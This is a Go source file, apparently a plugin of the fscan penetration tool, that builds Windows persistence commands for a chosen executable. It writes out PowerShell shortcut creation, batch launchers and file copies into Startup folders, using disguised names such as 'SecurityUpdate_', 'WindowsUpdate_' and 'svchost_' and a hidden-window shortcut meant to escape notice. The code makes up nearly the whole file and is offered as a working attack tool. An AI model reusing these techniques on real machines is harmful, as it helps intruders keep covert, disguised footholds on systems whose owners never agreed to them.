//go:build (plugin_winstartup || !plugin_selective) && windows && !no_local

package local

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strings"

	"github.com/shadow1ng/fscan/common"
	"github.com/shadow1ng/fscan/common/i18n"
	"github.com/shadow1ng/fscan/plugins"
)

// WinStartupPlugin Windows启动项持久化插件
// 设计哲学：直接实现，删除过度设计
// - 删除复杂的继承体系
// - 直接实现启动文件夹持久化功能
// - 保持原有功能逻辑
type WinStartupPlugin struct {
	plugins.BasePlugin
}

// NewWinStartupPlugin 创建Windows启动文件夹持久化插件
func NewWinStartupPlugin() *WinStartupPlugin {

	return &WinStartupPlugin{
		BasePlugin: plugins.NewBasePlugin("winstartup"),
	}
}

// Scan 执行Windows启动文件夹持久化 - 直接实现
func (p *WinStartupPlugin) Scan(ctx context.Context, info *common.HostInfo, session *common.ScanSession) *plugins.Result {
	config := session.Config
	_ = session.State
	var output strings.Builder

	// 从config获取配置
	pePath := config.WinPEFile
	

	if runtime.GOOS != "windows" {
		output.WriteString("Windows启动文件夹持久化只支持Windows平台\n")
		return &plugins.Result{
			Success: false,
			Output:  output.String(),
			Error:   fmt.Errorf("不支持的平台: %s", runtime.GOOS),
		}
	}

	if pePath == "" {
		output.WriteString("必须通过 -win-pe 参数指定PE文件路径\n")
		return &plugins.Result{
			Success: false,
			Output:  output.String(),
			Error:   fmt.Errorf("未指定PE文件"),
		}
	}

	// 检查目标文件是否存在
	if _, err := os.Stat(pePath); os.IsNotExist(err) {
		output.WriteString(fmt.Sprintf("PE文件不存在: %s\n", pePath))
		return &plugins.Result{
			Success: false,
			Output:  output.String(),
			Error:   err,
		}
	}

	// 检查文件类型
	if !p.isValidPEFile(pePath) {
		output.WriteString(fmt.Sprintf("目标文件必须是PE文件(.exe或.dll): %s\n", pePath))
		return &plugins.Result{
			Success: false,
			Output:  output.String(),
			Error:   fmt.Errorf("无效的PE文件"),
		}
	}

	output.WriteString("=== Windows启动文件夹持久化 ===\n")
	output.WriteString(fmt.Sprintf("PE文件: %s\n", pePath))
	output.WriteString(fmt.Sprintf("平台: %s\n\n", runtime.GOOS))

	// 创建启动文件夹持久化
	startupMethods, err := p.createStartupPersistence(pePath)
	if err != nil {
		output.WriteString(fmt.Sprintf("创建启动文件夹持久化失败: %v\n", err))
		return &plugins.Result{
			Success: false,
			Output:  output.String(),
			Error:   err,
		}
	}

	output.WriteString(fmt.Sprintf("创建了%d个启动文件夹持久化方法:\n", len(startupMethods)))
	for i, method := range startupMethods {
		output.WriteString(fmt.Sprintf("  %d. %s\n", i+1, method))
	}
	output.WriteString("\n✓ Windows启动文件夹持久化完成\n")

	common.LogSuccess(i18n.Tr("winstartup_success", len(startupMethods)))

	return &plugins.Result{
		Success: true,
		Type:    plugins.ResultTypeService,
		Output:  output.String(),
		Error:   nil,
	}
}

// createStartupPersistence 创建启动文件夹持久化
func (p *WinStartupPlugin) createStartupPersistence(pePath string) ([]string, error) {
	absPath, err := filepath.Abs(pePath)
	if err != nil {
		return nil, fmt.Errorf("failed to get absolute path: %w", err)
	}

	var startupMethods []string
	baseName := filepath.Base(absPath)
	baseNameNoExt := baseName[:len(baseName)-len(filepath.Ext(baseName))]

	startupLocations := []struct {
		path        string
		description string
		method      string
	}{
		{
			path:        `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`,
			description: "Current User Startup Folder",
			method:      "shortcut",
		},
		{
			path:        `%ALLUSERSPROFILE%\Microsoft\Windows\Start Menu\Programs\Startup`,
			description: "All Users Startup Folder",
			method:      "shortcut",
		},
		{
			path:        `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`,
			description: "Current User Startup Folder (Direct Copy)",
			method:      "copy",
		},
		{
			path:        `%TEMP%\WindowsUpdate`,
			description: "Temp Directory with Startup Reference",
			method:      "temp_copy",
		},
	}

	for _, location := range startupLocations {
		switch location.method {
		case "shortcut":
			shortcutName := fmt.Sprintf("WindowsUpdate_%s.lnk", baseNameNoExt)
			shortcutPath := filepath.Join(location.path, shortcutName)

			powershellCmd := fmt.Sprintf(`powershell "$WshShell = New-Object -comObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut('%s'); $Shortcut.TargetPath = '%s'; $Shortcut.Save()"`,
				shortcutPath, absPath)

			startupMethods = append(startupMethods, fmt.Sprintf("[%s] %s", location.description, powershellCmd))

		case "copy":
			targetName := fmt.Sprintf("SecurityUpdate_%s.exe", baseNameNoExt)
			targetPath := filepath.Join(location.path, targetName)
			copyCmd := fmt.Sprintf(`copy "%s" "%s"`, absPath, targetPath)

			startupMethods = append(startupMethods, fmt.Sprintf("[%s] %s", location.description, copyCmd))

		case "temp_copy":
			tempDir := filepath.Join(location.path)
			mkdirCmd := fmt.Sprintf(`mkdir "%s" 2>nul`, tempDir)
			targetName := fmt.Sprintf("svchost_%s.exe", baseNameNoExt)
			targetPath := filepath.Join(tempDir, targetName)
			copyCmd := fmt.Sprintf(`copy "%s" "%s"`, absPath, targetPath)

			startupMethods = append(startupMethods, fmt.Sprintf("[%s] %s && %s", location.description, mkdirCmd, copyCmd))

			shortcutPath := filepath.Join(`%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`, fmt.Sprintf("SystemService_%s.lnk", baseNameNoExt))
			powershellCmd := fmt.Sprintf(`powershell "$WshShell = New-Object -comObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut('%s'); $Shortcut.TargetPath = '%s'; $Shortcut.WindowStyle = 7; $Shortcut.Save()"`,
				shortcutPath, targetPath)

			startupMethods = append(startupMethods, fmt.Sprintf("[Hidden Temp Reference] %s", powershellCmd))
		}
	}

	batchScript := fmt.Sprintf(`@echo off
cd /d "%%~dp0"
start "" /b "%s"
exit`, absPath)

	batchPath := filepath.Join(`%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`, fmt.Sprintf("WindowsService_%s.bat", baseNameNoExt))
	batchCmd := fmt.Sprintf(`echo %s > "%s"`, batchScript, batchPath)
	startupMethods = append(startupMethods, fmt.Sprintf("[Batch Script Method] %s", batchCmd))

	return startupMethods, nil
}

// isValidPEFile 检查是否为有效的PE文件
func (p *WinStartupPlugin) isValidPEFile(filePath string) bool {
	ext := strings.ToLower(filepath.Ext(filePath))
	return ext == ".exe" || ext == ".dll"
}

// 注册插件
func init() {
	RegisterLocalPlugin("winstartup", func() Plugin {
		return NewWinStartupPlugin()
	})
}
